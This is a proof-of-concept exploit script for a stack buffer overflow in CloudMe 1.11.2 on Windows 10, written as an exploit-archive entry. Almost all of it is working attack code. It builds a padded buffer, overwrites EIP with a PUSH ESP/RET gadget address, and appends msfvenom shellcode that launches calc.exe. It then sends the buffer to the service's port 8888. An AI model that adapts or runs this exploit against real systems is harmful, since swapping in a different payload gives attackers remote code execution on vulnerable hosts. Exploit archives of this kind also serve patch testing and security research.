# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xb8\xfa\x1a\x54\x91\xd9\xcb\xd9\x74\x24\xf4\x5a"
payload += b"\x29\xc9\xb1\x3e\x31\x42\x15\x83\xc2\x04\x03\x42"
payload += b"\x11\xe2\x0f\xe6\xbc\x13\xef\x17\x3d\x74\x66\xf2"
payload += b"\x0c\xb4\x1c\x76\x3e\x04\x57\xda\xb3\xef\x35\xcf"
payload += b"\x40\x9d\x91\xe0\xe1\x28\xc7\xcf\xf2\x01\x3b\x51"
payload += b"\x71\x58\x6f\xb1\x48\x93\x62\xb0\x8d\xce\x8e\xe0"
payload += b"\x46\x84\x3c\x15\xe2\xd0\xfc\x9e\xb8\xf5\x84\x43"
payload += b"\x08\xf7\xa5\xd5\x02\xae\x65\xd7\xc7\xda\x2c\xcf"
payload += b"\x04\xe6\xe7\x64\xfe\x9c\xf6\xac\xce\x5d\x54\x91"
payload += b"\xfe\xaf\xa5\xd5\x39\x50\xd0\x2f\x3a\xed\xe2\xeb"
payload += b"\x40\x29\x67\xe8\xe3\xba\xdf\xd4\x12\x6e\xb9\x9f"
payload += b"\x19\xdb\xce\xf8\x3d\xda\x03\x73\x39\x57\xa2\x54"
payload += b"\xcb\x23\x80\x70\x97\xf0\xa9\x21\x7d\x56\xd6\x32"
payload += b"\xde\x07\x72\x38\xf3\x5c\x0f\x63\x9e\xa3\x82\x19"
payload += b"\xec\xa4\x9c\x21\x41\xcd\xad\xaa\x0e\x8a\x32\x79"
payload += b"\x6b\x64\x79\x20\xda\xed\x27\xb0\x5e\x70\xd8\x6e"
payload += b"\x9c\x8d\x5a\x9b\x5d\x6a\x42\xee\x58\x36\xc5\x02"
payload += b"\x11\x27\xa3\x24\x86\x48\xe6\x46\x12\xeb\x70\xe8"
payload += b"\x0f\x63\xf0\xb6\xa7\xf7\x94\x29\x5b\x8b\x08\xd1"
payload += b"\xe2\x06\xec\x68\x65\xb5\x63\xf2\xe1\x19\x15\x97"
payload += b"\xc7\xc4\x91\x32\x38\x2a\x04\x9d\x5b\x59\xa2\xf3"
payload += b"\xfe\xd9\x4f\x2c\x30\x2a\xa1\x1d\x02\x64\x8c\x69"
payload += b"\x4c\x4a\xda\xa3\xb0\x9b\x16\xf5\x84\xdb"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)